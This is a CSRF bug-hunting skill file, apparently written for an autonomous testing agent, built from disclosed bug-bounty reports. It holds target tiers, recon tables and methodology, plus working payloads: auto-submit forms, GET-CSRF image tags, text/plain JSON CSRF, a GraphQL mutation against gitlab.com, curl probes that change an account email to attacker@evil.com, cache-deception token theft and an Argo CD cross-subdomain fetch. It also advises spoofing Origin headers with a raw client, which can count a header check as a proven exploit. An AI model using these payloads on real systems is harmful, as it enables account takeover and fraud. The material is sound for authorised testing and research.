---
name: hunt-csrf
description: Hunting skill for CSRF vulnerabilities built from the FULL TEXT of 469 disclosed public reports (558-report corpus, 475 from TOP lists) — mined technique-frequency tables, 40 highest-signal reports with verbatim payload excerpts, ~90 "how I found it" discovery clues, and 60 payload exemplars. Covers modern SameSite-era variants: HackerOne Slack-integration OAuth CSRF ($2,500), GitLab GraphQL mutations-via-GET ($3,370), GitHub Enterprise path-traversal token bypass / CVE-2022-23732 ($10,000), Stripe Dashboard middleware disabled ($5,000), Argo CD sibling-subdomain SameSite bypass → K8s cluster compromise ($4,660), Logitech/Streamlabs null-byte OAuth state → one-click ATO, Shopify PayPal payment-provider link CSRF, TikTok JSON-CSRF via text/plain, Periscope Android/iOS deeplink CSRF ($1,540/$2,940), Bumble social-link ATO via leaked state, Khan Academy unconfirmed-email /signup/email ATO, and CSRF→stored-XSS / CSRF→reflected-XSS chains. Use when hunting modern CSRF — heavy emphasis on chain-to-ATO patterns and on distinguishing real state-change impact from the logout/token-missing N/A traps.
sources: github, hackerone_public, bugcrowd_public, portswigger_research, github_security_advisories, webhacklist, researcher_blogs
report_count: 558
full_reports_read: 469
---

## Crown Jewel Targets

CSRF pays highest when it touches a **state-changing action with account-level, financial, or infrastructure consequence** that a browser can be tricked into making cross-site. Across the 469 fully-read reports, the strongest signals clustered around API endpoints (100 reports), cookie/session handling (97), authenticated admin/internal panels (60), and SSO/OAuth link flows (46). Rank targets by what the forced request *does*, not by how the form looks.

- **Account-takeover vectors** — email/password change, security-question update, and "link another identity" flows. `/signup/email` on an unconfirmed account led to full ATO via password reset (Khan Academy #419891, #538800); changing security questions led to password-reset ATO (U.S. DoD #2652603, CVSS 8.8); profile email/password edits (U.S. DoD #2699029, #2712857) and `/member/updatesecurityquestions` (#2652603) are canonical.
- **OAuth / SSO / social-account linking** — `RelayState`/`state` is structurally a CSRF token; missing or guessable binding is account-linking CSRF. HackerOne's Slack integration trusted a third-party `state` (#170552, $2,500), Bumble leaked the `rt` state in a service worker (#127703), Basecamp skipped the authenticity token on `authorization.json` (#850022), and Periscope's Web OAuth authorize endpoint had no token or Origin validation (#215381). Instagram/Facebook router-config cookie parsing (#26647) and Streamlabs' null-byte-in-`state` bypass (#1046630, $200) are the same class.
- **Payment / financial actions** — add payment provider (Shopify PayPal, #807924), subscriptions/trials (Instacart #334139), donation settings (Streamlabs #1049360), gift cards that permanently lock a cart (Starbucks #206319), and payment-profile UUID manipulation (Uber #162809). Direct financial fraud, high severity.
- **Admin / internal configuration panels** — GitLab runner pause/resume (#415238), GoCD `/go/admin/restful/configuration/file/POST/xml` overwriting `cruise-config.xml` → server control (#240048), Grafana/Kibana/Jenkins defaults, and firmware/config restore on network appliances (Ubiquiti #329749, AirOS #289264). These often use GET with no token at all.
- **API endpoints accepting simple cross-origin requests** — JSON APIs that also accept `text/plain` or `application/x-www-form-urlencoded` (GitLab GraphQL GET mutations #1122408, Streamlabs donation_settings #1049360, New Relic monitor DELETE #140275), plus heartbeat/collect/activity APIs. A JSON endpoint is CSRF-resistant *only if* it rejects the CORS "simple" content types.
- **Third-party dashboards and embedded tooling on subdomains** — Grafana, Sentry, monitoring, embedded analytics. They lag on CSRF middleware and are reachable via sibling-subdomain or `Domain=.parent` cookie tricks (Argo CD #2326194; UberByte SSO #172137).
- **CSRF as a delivery primitive for XSS / SSRF / info-leak** — CSRF→stored self-XSS (Imgur #323005), CSRF→reflected XSS via `enctype=text/plain` (Urban Dictionary #1237321), CSRF→token leakage via Google Analytics (Shopify #196458), CSRF→Web Cache Deception token theft (#1271944), and CSRF-triggered authenticated SSRF (WordPress "Press This" #110801).
- **Mobile/deeplink handlers** — exported custom-scheme handlers (`pscp://user/<id>/follow`) let a plain link or QR code drive a state-changing action using the app's ambient session, with no browser token (Periscope Android #583987, iOS #805073, $1,540/$2,940).

Asset priority: **core auth/email flows > API gateways > third-party integrations on subdomains > admin panels**. Login CSRF, logout, and read-only GETs are the canonical N/A traps — only report them when there is a concrete downstream loss (forced-login data capture, session fixation).

### Target Value Tiers

| Tier | What it buys the attacker | Representative disclosed cases |
|------|---------------------------|--------------------------------|
| **Critical — account takeover** | Attacker gains a persistent login path or controls the victim's credentials/identity. | Unconfirmed-email change → reset (#419891, #538800); security-question change → reset (#2652603); social-account link (#127703, #1727221, #463330); null-byte OAuth state (#1046630). |
| **High — financial / admin control** | Direct money movement, purchases, or infrastructure/role control. | Add PayPal provider (#807924), free-trial subscription (#334139), donation settings (#1049360), GoCD config overwrite → server control (#240048), privilege escalation to WordPress Keymaster (#2999394), Argo CD → K8s cluster (#2326194). |
| **Medium — data / state mutation** | Deletion, deactivation, info disclosure, or spam with real user impact. | Contact deletion (#709537), album deletion (#2652190), account deactivation (#1121990), invite spam (#1961163, #8226), private-report escalation to JIRA (#226418). |
| **Low / conditional — delivery primitive** | CSRF is only the trigger; value comes from the chained XSS/SSRF/token leak. | CSRF→stored XSS (#323005), CSRF→reflected XSS (#1237321), token leak via cache/analytics (#1271944, #196458), CSRF→authenticated SSRF (#110801). |
| **N/A by default** | No concrete loss unless a downstream chain exists. | Bare logout CSRF, login CSRF without forced-session data capture, read-only GET, "token missing" on a no-op endpoint. |

The frequency table reinforces this: `csrf` appeared in 416 of the 469 reports, but the highest bounties clustered where CSRF chained to ATO — GitHub Enterprise's $10,000 token bypass (#1497169), Stripe's $5,000 middleware failure (#1483327), and Argo CD's $4,660 cluster compromise (#2326194). Always ask "what does the forced request let me *own*?" before scoring.

---

## Attack Surface Signals

### URL Patterns to Hunt

```
/oauth/authorize?RelayState=          # SAML/OIDC state, rarely bound
/auth/slack?state=                    # third-party OAuth connect (#170552)
/users/social_accounts/<provider>?code=&state=   # account link (#1727221)
/google/verify.phtml?rt=&code=        # Bumble leaked rt state (#127703)
/signup/email                         # unconfirmed-email ATO (#419891, #538800)
/account/profile/edit                 # profile + password edit (#2699029)
/member/updatesecurityquestions       # security-question → reset ATO (#2652603)
/api/graphql?query=mutation{...}      # GET-converted GraphQL mutations (#1122408)
/api/v6/viewer-portal/viewer-settings/donation_settings  # JSON CSRF (#1049360)
/admin/runners/:id/resume · /admin/runners/:id/pause     (#415238)
/go/admin/restful/configuration/file/POST/xml            # config overwrite (#240048)
/mediacallery/delete/id/{album-id}    # GET delete (#2652190)
/account/delete-contact/contact_id/<id>  # GET delete of contacts (#709537)
/folders                              # enctype=application/json form POST (#323005)
/authorization.json · /authorization.xml  # extension skips token check (#850022)
/i/cards/api/v1.json → /i/cards/api/v1   # trimming extension skips token (#95555)
/comments/create · /comment/post      # comment CSRF (#914232)
/v3/subscriptions                     # free-trial CSRF (#334139)
/pscp://user/<id>/follow              # Android/iOS deeplink CSRF (#583987, #805073)
```

### Response / Header Signals

```
Set-Cookie: session=abc; HttpOnly            # no SameSite = cross-site sendable
Set-Cookie: session=abc; SameSite=None       # explicitly allows cross-site
Set-Cookie: ...; Domain=.target.com         # subdomain can inject/steal session (#172137)
Access-Control-Allow-Origin: http://www.target.com  # http scheme trusted (#629892)
Access-Control-Allow-Credentials: true + ACAO reflecting Origin  # dangerous combo
Locaton: <third-party>/oauth/authorize?...&state=...  # state you can influence
No X-Frame-Options / permissive frame-ancestors        # clickjacking + login CSRF
X-CSRF / X-XSRF / X-CSRF-Token headers present in request but NOT validated (#1049360)
Hidden authenticity_token / csrfmiddlewaretoken / _token / csrf-token field
```

### JS / DOM Patterns

```javascript
// Static or reused tokens — grep the meta tag and compare across sessions/pages
meta[name="csrf-token"]        // check if value changes across sessions (#361131, #919112)
authenticity_token             // Rails — check reuse across page loads (#834366)
csrfmiddlewaretoken            // Django — check cross-user/session reuse (#26647)
// Forms with no hidden token at all
<form method="POST" action="/accounts/link">   // no token field
// JSON endpoints that may accept a simple content-type
fetch('/api/heartbeat', {method:'POST', body:JSON.stringify(data)})
// Deeplink handlers in AndroidManifest.xml / iOS Info.plist
<data android:host="user" android:scheme="pscp"/>   // #583987
```

### Raw-Client-First Shortcut (read before building a browser PoC)

A raw HTTP client (curl, Burp Repeater, any scripting client) is not a browser: it sends whatever `Origin`/`Referer` **value** you set, from any path, alongside the authenticated cookie. Many apps that claim CSRF protection only do a naive string check on those headers (does it contain/equal an expected value?) rather than genuine same-origin enforcement — you can satisfy that check directly, with no hosted page or headless browser.

```
POST /profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Origin: https://a-domain-the-app-treats-as-trusted.example
Cookie: <authenticated session>

username=csrf_poc
```

If a report or config names a specific origin as the "expected" attacker page, try that literal value in `Origin` (fall back to `Referer`). Only build a real cross-origin page when the target does genuine SameSite/fetch-based origin enforcement a spoofed header cannot satisfy.

### Autonomous Testing Priority

1. **GET the form endpoint** for a baseline; note hidden `csrf_token`, `authenticity_token`, `_token`, `csrfmiddlewaretoken` fields.
2. **POST the state-changing action with no token field** — send only functional parameters.
3. **Use a CORS "simple" Content-Type** — `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. A JSON endpoint is protected only if it rejects these (see JSON-CSRF section).
4. **2xx with no "invalid token" error → CSRF confirmed.**
5. **Scope out** login (no session to hijack), logout (no impact), and read-only GETs — unless part of a forced-login/session-fixation chain.

### Tech-Stack Signals

- **Rails** — `authenticity_token` static per session; trimming a URL extension (`authorization.json`, `v1.json → v1`) can skip the middleware (#850022, #95555).
- **Django** — `csrfmiddlewaretoken` reusable across users; Python's cookie parser treating `[ \ ] ,` as delimiters enabled token fixation via Google Analytics (#26647).
- **Express/Node** — CSRF middleware excluded on `/api/*` because "API clients don't need it"; Streamlabs removed `X-CSRF`/`X-XSRF` headers and still got 200 (#1049360).
- **GraphQL** — mutation via `?query=mutation{...}` while the backend only checks `X-CSRF-Token` on POST (#1122408).
- **SAMLv2/OIDC** — `RelayState`/`state` treated as a redirect hint, not a cryptographically bound state parameter (#170552, #171398).
- **BFF / SPA frameworks (e.g., Duende BFF)** — static `X-CSRF: 1` header with no user binding; see Bypass Techniques.

### Impact / State-Change Oracle (how you know it fired)

A CSRF test is only meaningful if you can observe the state change. Across the reports, researchers confirmed impact through:

```
Second-account observation       # log in as attacker, verify the victim's identity was linked (#1727221, #127703)
Password-reset login             # after email/security-question change, reset into the account (#538800, #2652603)
Response code / body difference  # 200 vs 403, "invalid token" vs success (#834366, #1049360)
Reflected value in later page    # stored XSS payload fires on render (#323005, #152013)
Admin UI state                   # runner paused/resumed, user deleted, config overwritten (#415238, #240048)
Email / SMS received             # unwanted invite or reset email in the victim's inbox (#753386, #1131473)
Cookie / session change          # forced login into attacker session, then observe victim activity (#229528, #1124540)
```

Log out and back in as the victim between tests when state is cached; some apps only reveal the change on a fresh session. For GET-based state changes, compare the page before and after the `<img src>` request (#2652190, #709537).

### Method / Token Field Cheat Sheet

```
Rails:        authenticity_token        # often static per session (#834366, #919112)
Django:       csrfmiddlewaretoken       # cookie+field double-submit, fixable via cookie parsing (#26647)
Express:      _csrf / csrf-token        # middleware often excluded on /api/*
PHP:          token / csrf_token        # frequently absent on secondary endpoints
GraphQL:      X-CSRF-Token header       # skipped when method = GET (#1122408)
SPA/BFF:      X-CSRF: 1                 # static, not user-bound (Duende)
OAuth:        state / RelayState / rt   # must be bound, unpredictable, single-use
Custom:       X-XSRF / X-CSRF-Token     # check whether the server actually validates (#1049360)
```

---

## Discovery Patterns From 469 Full Reports

This section is derived from reading the full text of 469 disclosed reports. It answers "how do researchers actually find these?" rather than "what is the payload?" Frequency numbers are counts of full reports containing that signal (the study pack's mined frequency table).

### Where Researchers Start

Recon surfaces, ranked by how often they appeared in the mined reports, with the concrete thing to look for at each:

| Rank | Recon surface | Reports | What to look for |
|------|---------------|---------|------------------|
| 1 | **State-changing endpoint / form inventory** | 416 (csrf) | Spider an authenticated session and enumerate every POST/PUT/DELETE/PATCH and every GET that mutates. Note hidden token fields and methods — GET-based deletes/releases were repeatedly vulnerable (#709537, #2652190, #415238, #1477050). |
| 2 | **API endpoint mapping** | 100 | JSON/REST routes with state-changing verbs. Send `text/plain` and `application/x-www-form-urlencoded` bodies with no token (#1049360); convert GraphQL mutations to GET (#1122408); send DELETE with no header (#140275). |
| 3 | **Cookie / SameSite inspection** | 97 | DevTools → Application → Cookies. Flag missing `SameSite`, `SameSite=None`, and `Domain=.parent.com`; test sibling-subdomain delivery and cross-site POST of the session cookie (#172137, #2326194). |
| 4 | **Search / filter / sort surfaces** | 90 | Query-driven actions that accept a URL or domain string often become GET state-changers or CSRF sinks. Look for mutations reachable by a crafted query string. |
| 5 | **Session / token lifecycle testing** | 86 | Log in twice and compare tokens across same-session reloads, different sessions, different users (#361131, #361130, #919112, #1086134). Test omission, empty value, cross-session substitution, and reuse after logout (#361131, #2857). |
| 6 | **Prior-report regression / bypass mining** | 51 (filter-bypass) | Read disclosed reports for the same program and retest the fix. Streamlabs #1046630 was explicitly a bypass of #1039749; Shopify #158434 bypassed an open-redirect fix with `%2F%2F`; HackerOne #301862 extended prior limited CSRF #99708. |
| 7 | **Admin / internal panels** | 60 | `/admin/*`, management consoles, appliance config pages — frequently GET-based with no token (GitLab #415238, GoCD #240048, Concrete5 #59660). |
| 8 | **SSO / OAuth link flows** | 46 | Intercept authorize/callback flows; test whether `state`/`RelayState` is validated or user-bound. Look for token leakage in JS/service-worker files (Bumble #127703) and third-party trust (#170552). |
| 9 | **Public code search** | 26 | Google/GitHub the token implementation and framework config: `authenticity_token`, `csrfmiddlewaretoken`, `X-CSRF`, `RelayState` handling, and CSRF-middleware exclusions. |
| 10 | **Subdomain / CORS misconfig enumeration** | 38 + 22 | Aquatone/DNS enum for `debug.*`, `staging.*`, `apps.*`; check ACAO reflecting `http://` origins and any subdomain as trusted (#927413, #629892, #975983). |
| 11 | **Cache / analytics / referer token leak** | 45 (cache-layer) | Hunt paths that reflect a token into a URL (`?authenticity_token=`) and leak it via Google Analytics or a caching proxy (#196458, #1271944, #260697). |
| 12 | **Image / file-upload / comment surfaces** | 80 + 79 | These fields often carry the CSRF-delivered stored/reflected XSS payload (Imgur #323005, Rockstar #152013, Urban Dictionary #1237321). |

Three recon sequences recur across the corpus:

1. **"Capture → strip → replay"** — capture a legitimate state-changing request in Burp, remove the token/header, replay with the victim cookie. This found HackerOne login CSRF (#834366), HackerOne report-join CSRF (#148517), Streamlabs donation-settings CSRF (#1049360), and New Relic monitor deletion (#140275). It is the single highest-yield first move.
2. **"Notice the method, not the token"** — the researcher sees the action is a GET (or GET-converted) and realizes no token is needed. Connect-Yahoo ATO (#423022), runner pause/resume (#415238), contact/album deletion (#709537, #2652190), curations creation (#1477050), and GraphQL mutations (#1122408) all came from this observation.
3. **"Compare two sessions"** — log in twice, diff the token values. Static or cross-user tokens turned up in Liberapay (#361131, #361130), Omise (#919112), Mail.ru (#1086134), and HackerOne (#834366). This is how "token present but useless" bugs are proven.

### Feature-Based Discovery Signals

Frequency-ranked suspicious features and sinks from the same 469 reports. This is the "way to find it" table — when you see the feature, run the probe.

| Signal | Reports | Why it matters / what to probe |
|--------|---------|--------------------------------|
| csrf | 416 | The core primitive. Omit the token, send a simple content-type, confirm the state change executes with only the victim's cookie. |
| api-endpoint | 100 | JSON/REST state-changers often skip CSRF middleware. Probe `text/plain`-encoded JSON and GET-converted mutations. |
| cookie-handling | 97 | SameSite/Domain attributes decide cross-site delivery. Flag no-SameSite, `None`, and parent-domain cookies. |
| search-filter-sort | 90 | Query-driven mutations reachable by GET are CSRF by construction. Probe parameter names against state-changing routes. |
| session-attack | 86 | Token staticness and session fixation. Compare tokens across sessions/users; test token reuse after logout. |
| image-processing | 80 | Image/profile-picture upload endpoints frequently lack tokens (Topcoder #868572, Chaturbate #401483). |
| comment-injection | 79 | Comment forms are classic token-less POSTs and XSS-delivery vehicles (#914232, #177639). |
| redirect-handling | 75 | Open redirects and 30x chains can convert a protected POST into a GET mutation or leak `state` (Shopify #158434). |
| server-side-rendering | 69 | Server-rendered fields reflect CSRF-delivered markup into stored/reflected XSS (#323005, #152013). |
| xml-parser | 65 | Config-upload XML endpoints with no token can overwrite server config (#240048, Concrete5 #59660). |
| admin-internal | 60 | High-blast-radius actions; check method and token on every admin route (#415238, #240048). |
| filter-bypass | 51 | The filter maps what developers feared — each blocked form hints at an unblocked sibling (null byte, extension trim, `{}` suffix). |
| sso-oauth | 46 | `state`/`RelayState` is the CSRF token. Test binding, predictability, and third-party trust (#170552, #1046630). |
| cache-layer | 45 | Token leakage via cache deception or URL-reflected tokens (#1271944, #196458, #260697). |
| subdomain-takeover | 38 | A takeover + parent-domain cookie = session injection; sibling subdomains defeat SameSite=Lax (#172137, #2326194). |
| brute-otp-reset | 32 | Reset/OTP flows with no token enable password/email reset forgery (#18698, #742, #2652603). |
| json-body | 31 | Nested JSON settings endpoints; try `text/plain` bodies that parse as JSON (#1049360, #140275). |
| public-code-search | 26 | Read framework config and token code, not just the rendered form. |
| stored | 24 | CSRF that stores an XSS payload turns a self-XSS into an attack on other users (#323005, #152013, #289264). |
| cors-misconfig | 22 | ACAO reflecting `http://` origins and any subdomain enables cross-origin reads/token theft (#629892, #975983). |
| proxy-feature | 22 | Proxy/forwarding endpoints mutate on GET and may accept cross-origin calls. |
| blind-oob | 20 | CSRF can drive a blind authenticated SSRF from a victim session (#110801). |
| subdomain | 22 | See "Subdomain / CORS" — weak siblings re-enable cross-site delivery. |
| clickjacking | 3 | Combined with login/logout CSRF to capture victim data in an attacker session (#171398, #214087). |
| graphql | 3 | Mutations via GET query string (#1122408) — mutation-polyglot signal. |
| null-byte | 2 | `%00` in `state` bypasses prefix/equality validation (#1046630). |
| websocket | 2 | CSWSH — cross-origin WebSocket with ambient cookie (Stripo #915541). |
| path-traversal-lfi | 8 | Router matches post-traversal path for execution but pre-traversal path for CSRF scope (#1497169, #301862). |
| mutation-polyglot / case-variation | 2 / 1 | Extension/format confusion to skip token middleware (`authorization.json`, `v1` vs `v1.json`, case variants). |

Read the frequency table as a map of developer anxiety: every high-count feature is a place someone tried to *prevent* CSRF and did it incompletely. A token field implies a validation routine worth fuzzing; a custom header implies a presence-only check; an `Origin` check implies a string comparison; a `SameSite=Lax` cookie implies a GET or sibling-subdomain path is still open. The lowest-frequency rows are often the highest-severity — `path-traversal-lfi` (8), `null-byte` (2), and `mutation-polyglot` (2) produced the $10,000 GitHub Enterprise result and the Streamlabs one-click ATO. Do not skip them because they are rare.

### Verbatim Discovery Clues

Real, lightly cleaned quotes showing exactly how researchers noticed the bug. Attribution is the HackerOne report ID.

1. [#423022] "I noticed Connect Yahoo account option have the workflow with GET method and there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker's yahoo account to victim's discourse account, and it leads to full account takeover"
2. [#1122408] "The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header."
3. [#2699029] "During my search in this domain I found it vulnerable to CSRF so I tried to escalate it Account takeover and I succeed"
4. [#834366] "We found a CSRF token bypass on the Hacker One login page."
5. [#850022] "I found that when making a post request to `authorization` endpoint it does not check the 'authenticity token' if you add ' .json or .xml ' like this 'authorization.json'."
6. [#127703] "I have noticed that the `rt` parameter is returned on almost all json responses so I tried to find a link that leaks it."
7. [#127703] "After digging for a while , I have found this link https://eu1." (the chrome-service-worker JS containing the `rt` value)
8. [#975983] "However, I discovered that regex logic for checking `Referer` header is flawed."
9. [#975983] "I found that adding `{` or `}` at the end of the domain pass the validation."
10. [#361131] "your csrf token did not expired and after login and logout many times , i found that your csrf token is generated same as last one."
11. [#361130] "Next, I found the same CSRF token is being during deleting all other available other platform logins."
12. [#148517] "When i deleted the first **Authenticity_token** from the Request and forwarded it, then i was able to join the report without the first authenticity token."
13. [#143321] "In my research, I found that a user supplied CSRF Token would be accepted and even saved in the browser cookie and will be the set token on subsequent request."
14. [#919112] "After finding i found that an authenticity-token can be used many times for a particular session leading to CSRF."
15. [#192131] "Basically when i was capturing the request and response http headers in burpsuite , it basically caught my eye that there was no use of csrf token being implemented here, so I crafted two html files..."
16. [#416682] "I noticed Changing video thumbnail option have the workflow with GET request and there is lack of csrf token on changing video thumbnail option,so if attacker somehow able to obtain the thumbnail_id of victim's video then it can..."
17. [#416978] "But because this would then redirect to settings/domains and initiate transfer, I decided to check what happens if I change the link to:"
18. [#2652190] "While performing some actions on it, I found that there is no CSRF verification when deleting albums."

### Probe Checklist

Copy-pasteable actions derived from the clues above.

1. **Token-omission replay**: capture a state-changing POST, delete the `authenticity_token`/`_token` field entirely, forward. 2xx = CSRF (#834366, #148517, #1049360).
2. **Simple Content-Type swap**: change `application/json` to `text/plain` with a JSON-shaped body, or to `application/x-www-form-urlencoded` (#1049360, #323005).
3. **GraphQL mutation via GET**: `GET /api/graphql?query=mutation{createSnippet(input:{...}){snippet{id}}}` in an `<img src>` — no `X-CSRF-Token` needed on GET (#1122408).
4. **Extension trim**: POST to `.../authorization.json` and to `.../v1` (trim `v1.json`) — middleware often keyed to the unsuffixed route (#850022, #95555).
5. **Token staticness across sessions**: extract the token from session A and replay it in session B; also compare across reloads and users (#361130, #919112, #1086134).
6. **Empty / substituted token**: send `_token=` empty, then a well-formed but wrong value, then a token from another session (#834366, #1046630).
7. **Origin/Referer string check**: set `Origin` literally to the domain the app treats as trusted; if that fails, try `Referer`. Then try `null`, subdomain, and `target.com.evil.com` (#629892, #975983).
8. **Referer regex suffix**: append `{` or `}` to the expected domain in `Referer` — flawed regex logic accepted it (#975983).
9. **Null-byte state bypass**: append `%00` to the `state` parameter in a captured OAuth link callback and host the PoC (#1046630).
10. **Leaked-state hunt**: grep JS/service-worker bundles for the state variable (`rt`, `url_stats`) and fetch the file that reflects it (#127703).
11. **SameSite sibling-subdomain fetch**: from `marketing.<parent>`, `fetch('<target>/api/...',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'}})` (#2326194).
12. **GET state-changer as image/form**: `<img src="https://target/admin/runners/42/resume">` or a `method=GET` form for deletes/pauses (#415238, #2652190, #709537).
13. **Web Cache Deception token theft**: append `/random.css` to an authenticated page and check for a cached response containing the token (#1271944, #260697, #423986).
14. **Analytics/referer token leak**: check whether `?authenticity_token=<victim_token>` lands in a third-party analytics request you control (#196458).
15. **Deeplink CSRF**: from the mobile manifest, open `pscp://user/<id>/follow` or a QR code and confirm the follow/link action on the ambient app session (#583987, #805073).

---

## Step-by-Step Hunting Methodology

1. **Map every state-changing endpoint.** Spider an authenticated session; filter for POST/PUT/DELETE/PATCH **and** GET routes that mutate (delete, pause, resume, link, add-to-cart, subscribe). Note every hidden token field and every custom CSRF header.
   - Include API docs, GraphQL introspection, JS bundles, and the admin panel — the most severe bugs hid on secondary routes the developers forgot to protect (#709537, #415238, #140275).
2. **Establish a baseline.** GET the form, capture a valid request with a real token, and save the exact parameter set so omission/substitution tests are clean.
   - Record the token's shape, length, and whether it rotates on reload; this tells you which bypass to try first.
3. **Run the token-omission and staticness matrix.** Remove the token; send it empty; substitute another session's; reuse one from a logged-out session. Compare across two sessions and two users. Any acceptance = broken validation (#834366, #361130, #919112).
   - Also try a correctly-formed fake value — some servers validate format only (#1046630, #143321).
4. **Test content-type enforcement on JSON endpoints.** Send `text/plain` with a JSON-shaped body, and `application/x-www-form-urlencoded`. If either parses, an HTML form can trigger it cross-origin (#1049360, #140275, #323005).
   - Do not skip a JSON endpoint just because `application/json` is required by the UI — the parser is often lenient.
5. **Check cookie posture.** Flag no-SameSite / `SameSite=None` / `Domain=.parent.com`. For `Lax`, test GET-triggerable actions and sibling-subdomain delivery (#2326194, #172137).
   - A `Domain=.parent.com` cookie plus a taken-over sibling is a session-injection primitive, not just a CSRF delivery path.
6. **Test Origin/Referer checks with a raw client first.** Set the header value directly before hosting a page; only escalate to a real cross-origin page if genuine SameSite/fetch enforcement is in play (#629892, #975983).
   - A literal origin named in a report or config is often exactly the string the check looks for — try it verbatim.
7. **Hunt OAuth/SSO link flows.** Intercept authorize and callback requests; test whether `state`/`RelayState` is validated, user-bound, and single-use. Look for state leakage in JS bundles and service workers (#170552, #127703, #850022, #1046630).
   - Initiate the flow on your own account, capture the callback, and replay it on the victim's session — the classic account-linking ATO.
8. **Look for token leakage primitives.** Web Cache Deception, Google Analytics/reflected tokens, CSS injection, and XSRF-in-cookie design all convert a "token present" app into a CSRF (#1271944, #196458, #386334, #2427).
   - A token inside a cookie is not a secret from an attacker who can inject/set cookies.
9. **Test third-party / subdomain dashboards.** Check versions and default CSRF posture for Grafana, GoCD, Concrete5, Jenkins, and BFF-style SPAs; try sibling-subdomain or `X-CSRF: 1` replay (#2326194, #240048, #59660).
10. **Probe mobile/deeplink handlers.** Enumerate exported custom schemes and test whether opening one mutates state with the app's ambient session (#583987, #805073).
11. **Chain to impact.** A bare "token missing" is a starting point, not impact. Aim at ATO (email/password/security-question/link), financial loss, admin action, or a CSRF→XSS/SSRF chain (#419891, #2652603, #323005).
12. **Build the PoC and confirm victim loss.** Host on a different origin, auto-submit, and verify the action executed in the victim's account. For header-check-only apps, a raw client with the spoofed header is sufficient proof.
13. **Retest the fix.** Several top reports were bypasses of earlier patches (Streamlabs #1046630, Shopify #158434, HackerOne #301862). After a vendor fix, re-run the exact comparison step they added.
14. **Run Gate 0 before reporting.** If the PoC needs an improbable token, a specific cookie state, or no real consequence, keep hunting.

---

## Payload & Detection Patterns

### Basic CSRF PoC (Form POST)

```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/v1/account/link">
    <input type="hidden" name="provider" value="attacker_account_id" />
    <input type="hidden" name="token" value="oauth_token_here" />
  </form>
</body>
</html>
```

### Minimal GET-CSRF PoC (admin/delete actions)

```html
<!-- GET state-changers need no form at all (#415238, #2652190, #709537) -->
<img src="https://target.com/admin/runners/42/resume">
<!-- or -->
<script>location.href='https://target.com/account/delete-contact/contact_id/123';</script>
```

### JSON CSRF via text/plain (bypasses Content-Type check)

```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/heartbeat" enctype="text/plain">
    <!-- browser sends: {"status":"ok","x":"=padding"} -->
    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
  </form>
</body>
</html>
```

The same trick with `enctype='application/json'` reflected a POST body as HTML in the Urban Dictionary case (#1237321), and with a name containing a CRLF + `<script>` produced stored/reflected XSS (#323005, #961787).

### GraphQL Mutation via GET (#1122408)

```html
<img src="https://gitlab.com/api/graphql?query=mutation{createSnippet(input:{title:%22x%22,visibilityLevel:public,content:%22pwn%22}){snippet{id}}}">
```

The backend skipped `X-CSRF-Token` validation whenever the method was GET; GraphQL accepted mutations from the `?query=` string.

### Token-Omission / Reuse Probes (curl)

```bash
# Omit token — capture a valid request, then replay without the token field
curl -s -X POST https://target.com/settings/email \
  -H "Cookie: session=YOUR_SESSION" \
  -d "email=attacker@evil.com" -v 2>&1 | grep -E "HTTP|location|error"

# Cross-session token reuse
TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')
curl -s -X POST https://target.com/settings/update \
  -H "Cookie: session=SESSION_B" \
  -d "authenticity_token=$TOKEN_A&email=test@test.com" -v

# Origin/Referer string-check probe — set the value directly, no browser needed
curl -s -X POST https://target.com/profile \
  -H "Origin: https://a-trusted-or-attacker-controlled.example" \
  -H "Cookie: session=YOUR_SESSION" -d "username=csrf_poc" -v
```

### OAuth Link / Null-Byte State PoC (#1046630, #170552, #127703)

```html
<!-- attacker initiates OAuth on their account, captures callback, adds null byte -->
<html><body>
<a href="https://target.com/auth/slack/callback?code=ATTACKER_CODE&state=PREDICTABLE%00">
  Link your Slack
</a>
<!-- victim's logged-in browser completes the link → attacker's Slack now a login path -->
</body></html>
```

Key checks: does `state` change per request, is it bound to the user, is it single-use, and does a suffix (`%00`, `{`, `}`) bypass the comparison? Bumble leaked the `rt` state straight from a service-worker JS file (#127703).

### Web Cache Deception → Token Theft (#1271944, #260697, #423986)

```bash
# While authenticated, request a private page with a static-looking extension
curl -s -H "Cookie: session=VICTIM" \
  "https://target.com/account/settings/random.css"
# If a cache key ignores the path suffix, the response (with CSRF token) is cached.
# Attacker then fetches the same URL to read the victim's token.
curl -s "https://target.com/account/settings/random.css"
```

Also probe `?authenticity_token=` reflected into a URL that leaks via Google Analytics (#196458) or via `Referer` to an external site (#76733).

### SameSite / Sibling-Subdomain JSON Fetch (#2326194)

```javascript
// Hosted on marketing.<parent>, targets argocd.<parent> — SameSite=Lax is moot
fetch('https://argocd.internal.<parent>/api/v1/applications', {
  method:'POST', credentials:'include',
  body:'{"metadata":{"name":"pwn"},"spec":{"source":{"repoURL":"https://attacker/manifest.git"}}}'
})
```

No `Content-Type: application/json` was enforced, so the fetch stayed a "simple" request and the session cookie rode along. Check BFF-style apps for a static `X-CSRF: 1` header that is not user-bound.

### Mobile Deeplink CSRF (#583987, #805073)

```html
<a href="pscp://user/<victim-id>/follow">Follow me on Periscope</a>
<!-- or embed a QR code encoding: pscp://user/<id>/follow -->
```

Enumerate exported schemes in `AndroidManifest.xml` (`<data android:scheme="pscp">`) and iOS `Info.plist`.

### Grep Patterns for Recon

```bash
# Find CSRF token fields in HTML responses
grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value="[^"]+"'
# Find forms without CSRF tokens
grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -L "csrf\|token\|nonce"
# Check SameSite / Domain in response headers
curl -sI https://target.com/login | grep -i "set-cookie"
# Find RelayState / state handling in JS
grep -rE "RelayState|state=|authenticity_token|X-CSRF" --include="*.js" .
# Fingerprint CSRF middleware exclusions in source
grep -rE "csrf_exempt|skip_before_action|IgnoreAntiforgeryToken|DisableAntiforgery|/api/\*" .
```

### Cross-Site WebSocket Hijacking (CSWSH) Probe

```javascript
// No custom headers possible on WS → Origin check is the only defense
